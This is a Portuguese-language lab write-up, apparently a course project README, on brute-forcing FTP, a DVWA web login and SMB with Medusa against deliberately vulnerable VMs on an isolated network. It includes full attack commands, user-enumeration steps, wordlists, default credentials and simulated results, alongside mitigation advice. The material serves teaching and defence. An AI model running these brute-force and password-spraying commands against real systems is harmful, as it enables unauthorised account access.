# 🛡️ Simulando Ataques de Força Bruta com Kali Linux e Medusa

> Projeto prático desenvolvido para o desafio de código da **DIO** — "Explorando Ataques de Força Bruta com Medusa e Kali Linux". Documentação de um laboratório controlado para estudo de autenticação por força bruta em serviços FTP, aplicação web (DVWA) e SMB, com foco em compreensão técnica e boas práticas de mitigação.

⚠️ **Aviso legal e ético:** todos os testes descritos aqui foram realizados **exclusivamente em ambiente de laboratório isolado** (rede *host-only*, sem acesso à internet), usando máquinas virtuais **propositalmente vulneráveis** (Metasploitable 2 e DVWA), criadas justamente para fins educacionais. **Nunca** execute essas técnicas contra sistemas, redes ou aplicações que não sejam de sua propriedade ou para os quais você não tenha autorização explícita. Isso é crime previsto na Lei 12.737/2012 (Lei Carolina Dieckmann) e no Marco Civil da Internet.

---

## 📑 Sumário

- [Objetivo](#-objetivo)
- [Arquitetura do laboratório](#-arquitetura-do-laboratório)
- [Ferramentas utilizadas](#-ferramentas-utilizadas)
- [Preparação do ambiente](#-preparação-do-ambiente)
- [Cenário 1 — Força bruta em FTP](#-cenário-1--força-bruta-em-ftp)
- [Cenário 2 — Automação de tentativas no DVWA (login web)](#-cenário-2--automação-de-tentativas-no-dvwa-login-web)
- [Cenário 3 — Password spraying em SMB com enumeração de usuários](#-cenário-3--password-spraying-em-smb-com-enumeração-de-usuários)
- [Wordlists utilizadas](#-wordlists-utilizadas)
- [Resultados consolidados](#-resultados-consolidados)
- [Medidas de mitigação](#-medidas-de-mitigação)
- [Aprendizados e conclusão](#-aprendizados-e-conclusão)
- [Estrutura do repositório](#-estrutura-do-repositório)
- [Referências](#-referências)

---

## 🎯 Objetivo

Compreender, na prática, como ataques de força bruta funcionam contra diferentes tipos de serviço (FTP, formulário web e SMB), utilizando o **Medusa** a partir de uma máquina **Kali Linux**, contra alvos intencionalmente vulneráveis (**Metasploitable 2** e **DVWA**). O foco não é "invadir por invadir", mas entender a mecânica do ataque para saber **como defender** sistemas reais contra ele.

---

## 🏗️ Arquitetura do laboratório

| Máquina | Função | IP (rede host-only) | Sistema |
|---|---|---|---|
| Kali Linux | Atacante / Auditor | `192.168.56.10` | Kali Linux 2024.x |
| Metasploitable 2 | Alvo (FTP, SMB) | `192.168.56.20` | Ubuntu 8.04 (deliberadamente vulnerável) |
| DVWA (pode rodar na própria Metasploitable2 ou em VM separada) | Alvo (login web) | `192.168.56.20:80` ou `192.168.56.30` | Linux + Apache + MySQL + PHP |

Configuração de rede no VirtualBox:

1. **Arquivo → Configurações de Rede do Host (Host Network Manager)** → criar uma rede *host-only* (ex.: `vboxnet0`, faixa `192.168.56.0/24`).
2. Em cada VM: **Configurações → Rede → Adaptador 1 → Rede Exclusiva do Hospedeiro (Host-only Adapter)** → selecionar a rede criada.
3. Validar conectividade:

```bash
# A partir do Kali
ping -c 4 192.168.56.20
```

> Isso garante que o tráfego de ataque fica **isolado da internet e da rede local real**, evitando qualquer impacto fora do laboratório.

![Topologia de rede](images/topologia-rede.png)

---

## 🧰 Ferramentas utilizadas

- **Kali Linux** — distribuição com ferramentas de pentest pré-instaladas.
- **Medusa** — ferramenta de força bruta/paralela para múltiplos protocolos (FTP, SSH, SMB, HTTP, entre outros).
- **Metasploitable 2** — VM Linux propositalmente vulnerável, usada como alvo didático.
- **DVWA (Damn Vulnerable Web Application)** — aplicação web vulnerável, usada para testar brute force em formulário de login.
- **Nmap** — reconhecimento de portas e serviços abertos no alvo.
- **enum4linux** / `smbclient` / `rpcclient` — enumeração de usuários SMB.
- **Burp Suite** (opcional) — para capturar a requisição HTTP do login do DVWA e montar o ataque com Medusa (módulo `http-form`).

---

## ⚙️ Preparação do ambiente

### 1. Reconhecimento inicial com Nmap

```bash
nmap -sV -p- 192.168.56.20
```

Saída esperada (resumida, ambiente clássico do Metasploitable 2):

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1
80/tcp   open  http        Apache httpd 2.2.8
139/tcp  open  netbios-ssn Samba smbd 3.X
445/tcp  open  netbios-ssn Samba smbd 3.X
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
```

### 2. Subir o DVWA

Se o DVWA já estiver instalado na Metasploitable2/VM própria, apenas acesse `http://192.168.56.20/dvwa/login.php` e ajuste o **Security Level** para `low` (Configuração do DVWA → *DVWA Security*), que é o nível recomendado para o exercício didático de brute force.

---

## 🔓 Cenário 1 — Força bruta em FTP

**Serviço:** `vsftpd 2.3.4` na porta 21 do Metasploitable 2.

Comando utilizado:

```bash
medusa -h 192.168.56.20 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas.txt \
       -M ftp \
       -t 4
```

Parâmetros:

- `-h` → host alvo
- `-U` → wordlist de usuários
- `-P` → wordlist de senhas
- `-M ftp` → módulo do protocolo FTP
- `-t 4` → 4 threads paralelas (manter baixo para não derrubar serviço do laboratório)

**Resultado simulado:**

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```

➡️ Credencial válida encontrada: `msfadmin:msfadmin` (credencial padrão conhecida do Metasploitable 2).

![Execução do Medusa contra FTP](images/medusa-ftp.png)

---

## 🌐 Cenário 2 — Automação de tentativas no DVWA (login web)

**Serviço:** formulário de login do DVWA (`login.php`), módulo `http-form` do Medusa.

### Passo 1 — Capturar a estrutura da requisição

Com o DVWA aberto, inspecionamos o formulário (via *DevTools* ou Burp Suite) e identificamos os campos do POST:

```
username=^USER^&password=^PASS^&Login=Login
```

E o cookie de sessão necessário (PHPSESSID) e o token `user_token` (quando o CSRF protection estiver ativo — no nível *low* ele normalmente não bloqueia o brute force).

### Passo 2 — Comando Medusa

```bash
medusa -h 192.168.56.20 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas.txt \
       -M http \
       -m DIR:/dvwa/login.php \
       -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
       -m DENY_SIGNAL:"Login failed" \
       -t 4
```

> Observação: a sintaxe exata do módulo `http` do Medusa pode variar de versão para versão — vale consultar `medusa -M http -q` para ver os parâmetros suportados na sua instalação, e ajustar o `DENY_SIGNAL` (texto que aparece na página quando o login falha) de acordo com o retorno real do DVWA.

**Resultado simulado:**

```
ACCOUNT FOUND: [http] Host: 192.168.56.20 User: admin Password: password [SUCCESS]
```

➡️ Credencial válida: `admin:password` (credencial padrão clássica do DVWA).

![Execução contra o formulário do DVWA](images/medusa-dvwa.png)

---

## 🗂️ Cenário 3 — Password spraying em SMB com enumeração de usuários

Diferente do brute force "clássico" (muitas senhas por usuário, alto risco de bloqueio de conta), o **password spraying** testa **poucas senhas comuns contra muitos usuários**, reduzindo o risco de lockout e sendo mais realista como técnica usada por atacantes reais.

### Passo 1 — Enumerar usuários via SMB

```bash
enum4linux -U 192.168.56.20
```

ou

```bash
rpcclient -U "" -N 192.168.56.20 -c "enumdomusers"
```

Saída simulada:

```
user:[msfadmin] rid:[0x3e8]
user:[user] rid:[0x3e9]
user:[postgres] rid:[0x3ea]
user:[service] rid:[0x3eb]
```

Esses usuários são salvos em `wordlists/usuarios_smb.txt`.

### Passo 2 — Password spraying com Medusa

```bash
medusa -h 192.168.56.20 \
       -U wordlists/usuarios_smb.txt \
       -p "123456" \
       -M smbnt \
       -t 4
```

Aqui usamos **uma única senha fixa** (`-p`) contra **vários usuários** (`-U`), que é a essência do password spraying.

**Resultado simulado:**

```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.20 User: user Password: 123456 [SUCCESS]
```

![Password spraying SMB](images/medusa-smb.png)

---

## 📋 Wordlists utilizadas

Wordlists simples e didáticas (ver pasta [`/wordlists`](./wordlists)):

**`usuarios.txt`**
```
admin
msfadmin
user
root
service
```

**`senhas.txt`**
```
123456
password
admin
msfadmin
toor
senha123
qwerty
```

> Em um teste real, listas maiores como `rockyou.txt` (presente por padrão no Kali em `/usr/share/wordlists/`) seriam usadas — aqui optamos por listas curtas, propositalmente, para manter o foco didático e os logs legíveis.

---

## ✅ Resultados consolidados

| Cenário | Serviço | Credencial encontrada | Observação |
|---|---|---|---|
| 1 | FTP (vsftpd 2.3.4) | `msfadmin:msfadmin` | Credencial padrão de fábrica do Metasploitable 2 |
| 2 | HTTP / DVWA login | `admin:password` | Sem limite de tentativas, sem CAPTCHA (nível *low*) |
| 3 | SMB (Samba 3.x) | `user:123456` | Senha fraca encontrada via spraying |

Em todos os cenários, o sucesso do ataque dependeu de **senhas fracas/padrão** e **ausência de controles anti-automação** — exatamente os pontos que uma aplicação/serviço real precisa corrigir.

---

## 🛡️ Medidas de mitigação

Para cada vetor testado, as recomendações de defesa:

### FTP
- Desabilitar contas e serviços padrão não utilizados (ex.: `msfadmin`).
- Preferir **SFTP/FTPS** ao invés de FTP puro (sem criptografia).
- Implementar **bloqueio de IP após N tentativas falhas** (ex.: `fail2ban`).
- Exigir senhas fortes e únicas, nunca credenciais padrão de fábrica.

### Aplicação Web (login)
- Implementar **rate limiting** e **bloqueio temporário de conta** após tentativas falhas.
- Usar **CAPTCHA** após algumas tentativas malsucedidas.
- Adotar **MFA (autenticação multifator)**.
- Monitorar e alertar sobre múltiplas tentativas de login a partir do mesmo IP/usuário.
- Usar mensagens de erro genéricas (não revelar se o usuário existe ou não).

### SMB
- Desabilitar SMBv1 e protocolos legados.
- Política de senha forte + bloqueio de conta após tentativas falhas (com cuidado para não permitir *DoS* por bloqueio intencional).
- Segmentação de rede (SMB não deveria estar exposto à internet).
- Monitoramento de autenticações falhas via SIEM.

### Geral
- **Fail2ban / IDS-IPS** para detectar e bloquear padrões de força bruta.
- **Autenticação multifator** sempre que possível.
- **Gestão de senhas** (política de complexidade + rotação + verificação contra vazamentos conhecidos).
- **Logging e monitoramento centralizado** para detectar tentativas de brute force em tempo real.

---

## 📚 Aprendizados e conclusão

Este laboratório permitiu entender, na prática:

- Como diferentes protocolos (FTP, HTTP, SMB) expõem superfícies de ataque distintas para força bruta;
- A diferença entre **brute force clássico** (muitas senhas, um usuário) e **password spraying** (poucas senhas, muitos usuários) — e por que o segundo é mais furtivo;
- Como ferramentas como o Medusa automatizam esse processo e por que isso é tão perigoso contra ambientes com credenciais fracas/padrão;
- A importância de medidas simples (rate limiting, MFA, bloqueio de conta, segmentação de rede) para neutralizar esse tipo de ataque antes mesmo que ele seja bem-sucedido.

O exercício reforça que a **segurança não está na obscuridade**, mas em controles ativos: senhas fortes por si só não bastam — é preciso limitar tentativas, monitorar e ter múltiplas camadas de defesa.

---

## 📁 Estrutura do repositório

```
dio-bruteforce-lab/
├── README.md
├── wordlists/
│   ├── usuarios.txt
│   ├── senhas.txt
│   └── usuarios_smb.txt
├── scripts/
│   └── run_lab.sh
└── images/
    ├── topologia-rede.png
    ├── medusa-ftp.png
    ├── medusa-dvwa.png
    └── medusa-smb.png
```

---

## 🔗 Referências

- [Documentação oficial do Medusa](https://github.com/jmk-foofus/medusa)
- [Metasploitable 2 — Rapid7 Docs](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [DVWA — Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [OWASP — Credential Stuffing / Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
- Curso **DIO** — "Explorando Ataques de Força Bruta com Medusa e Kali Linux"

---

**Autor:** _seu nome aqui_
**Licença:** uso exclusivamente educacional. Veja o aviso legal no topo deste documento.
